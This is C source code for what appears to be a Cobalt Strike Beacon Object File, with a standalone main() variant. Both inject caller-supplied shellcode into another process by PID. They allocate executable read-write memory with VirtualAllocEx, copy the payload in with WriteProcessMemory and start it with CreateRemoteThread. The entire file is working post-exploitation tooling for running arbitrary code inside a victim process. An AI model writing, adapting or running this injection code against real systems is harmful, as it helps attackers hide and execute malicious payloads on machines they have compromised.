#define _WIN32_WINNT 0x0600
#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"


DWORD createremotethread(PROCESS_INFORMATION* lpProcessInfo, LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD  dwErrorCode = ERROR_SUCCESS;
    LPVOID lpRemoteBuffer = NULL;
    HANDLE hRemoteThread = NULL;
 
    //internal_printf("hThread:               %p\n", lpProcessInfo->hThread);
    //internal_printf("hProcess:              %p\n", lpProcessInfo->hProcess);
    //internal_printf("dwProcessId:           %u\n", lpProcessInfo->dwProcessId);
    //internal_printf("dwThreadId:            %u\n", lpProcessInfo->dwThreadId);
    //internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    //internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);

    // Allocate remote buffer
    lpRemoteBuffer = KERNEL32$VirtualAllocEx(
        lpProcessInfo->hProcess, 
        NULL, 
        dwShellcodeBufferSize+1, 
        MEM_RESERVE|MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE
    );
    if ( NULL == lpRemoteBuffer )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("VirtualAllocEx failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    if ( FALSE == KERNEL32$WriteProcessMemory(
        lpProcessInfo->hProcess, 
        lpRemoteBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        NULL
        )
    )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("WriteProcessMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Execute the remote buffer
    hRemoteThread = KERNEL32$CreateRemoteThread(
        lpProcessInfo->hProcess, 
        NULL, 
        0, 
        lpRemoteBuffer, 
        NULL, 
        0, 
        NULL
    );
    if ( NULL == hRemoteThread )
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("CreateRemoteThread failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Should we WaitForSingleObject on hThread, then VirtualFree the memory?

end:
    if (hRemoteThread)
    {
        KERNEL32$CloseHandle(hRemoteThread);
        hRemoteThread = NULL;
    }

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
    
    // Get the arguments <PID> <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    dwPid = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Get a handle to the injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("createremotethread( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = createremotethread(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "createremotethread failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Check to see if we received any arguments
    if (3 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }

    // Get the arguments <PID> <SHELLCODE>
    dwPid = atoi(argv[1]);
    if (USHRT_MAX < dwPid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PID: %s\n", argv[1]);
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }
    
    dwErrorCode = ReadFileIntoBuffer(argv[2], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to our injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("createremotethread( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = createremotethread(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "createremotethread failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
